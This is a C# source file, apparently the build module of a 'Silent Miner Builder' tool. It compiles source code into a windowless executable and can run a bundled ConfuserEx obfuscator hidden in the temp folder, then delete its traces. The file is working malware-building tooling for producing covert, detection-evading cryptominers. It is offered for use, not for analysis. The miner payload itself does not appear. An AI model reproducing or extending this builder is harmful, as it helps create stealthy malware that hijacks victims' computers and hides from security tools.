using Microsoft.VisualBasic;
using System.CodeDom.Compiler;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;

class Compiler
{
    public static bool Compile(string EXE_Name, string Source, bool obfuscator)
    {
        CodeDomProvider Compiler = CodeDomProvider.CreateProvider("CSharp");
        CompilerParameters Parameters = new CompilerParameters();
        CompilerResults cResults = default(CompilerResults);

        Parameters.GenerateExecutable = true;
        Parameters.OutputAssembly = EXE_Name;
        Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
        Parameters.ReferencedAssemblies.Add("System.dll");
        Parameters.ReferencedAssemblies.Add("System.Data.dll");
        Parameters.ReferencedAssemblies.Add("System.Xml.dll");       
        Parameters.CompilerOptions = " /target:winexe";
        Parameters.TreatWarningsAsErrors = false;
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source);

        if (cResults.Errors.Count > 0)
        {
            foreach (CompilerError CompilerError_loopVariable in cResults.Errors)
            {
                CompilerError error = CompilerError_loopVariable;
                MessageBox.Show("Error: " + error.ErrorText + " Line : " + error.Line, "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return false;
        }
        else if (cResults.Errors.Count == 0)
        {
            if(obfuscator == true)
            {
                Confuser(EXE_Name, EXE_Name);
            }

            MessageBox.Show("Build Successfully " + EXE_Name, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return true;
        }
        MessageBox.Show("Build Successfully " + EXE_Name, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        return true;
    }

    private static void Confuser(string file, string output)
    {       
        string configconfuser = Silent_Miner_Builder.Properties.Resources.config.ToString();
        configconfuser = configconfuser.Replace("%path%", Path.GetTempPath())
            .Replace("%stub%", file);

        File.WriteAllText(Path.GetTempPath() + "configconfuser.crproj", configconfuser);
        File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Silent_Miner_Builder.Properties.Resources.ConfuserEx);

        if (Directory.Exists(Path.GetTempPath() + "Confuser"))
        {
            Directory.Delete(Path.GetTempPath() + "Confuser", true);
            Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
        }

        ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");
        
        Interaction.Shell(Path.GetTempPath() + @"Confuser\Confuser.CLI.exe -n " + Path.GetTempPath() + "configconfuser.crproj", AppWinStyle.Hide, true);

        File.Delete(Path.GetTempPath() + "confuser.zip");
        File.Delete(Path.GetTempPath() + "configconfuser.crproj");


    }
}
  

